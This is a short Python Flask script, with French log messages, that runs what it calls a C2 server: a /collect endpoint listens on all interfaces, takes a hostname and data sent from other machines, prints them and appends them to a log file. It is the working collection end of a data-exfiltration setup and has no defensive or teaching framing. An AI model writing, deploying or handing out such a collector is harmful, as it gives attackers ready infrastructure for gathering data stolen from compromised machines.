from flask import Flask, request

app = Flask(__name__)

@app.route('/collect', methods=['POST'])
def collect():
    hostname = request.form.get('hostname', 'Unknown')
    data = request.form.get('data', '')
    
    print(f"[*] Données reçues de {hostname} : {data}")
    
    with open("log.txt", "a") as f:
        f.write(f"[{hostname}] : {data}\n")
    return "Success", 200

if __name__ == '__main__':
    print("Serveur C2 écoute sur le port 5000...")
    app.run(host='0.0.0.0', port=5000)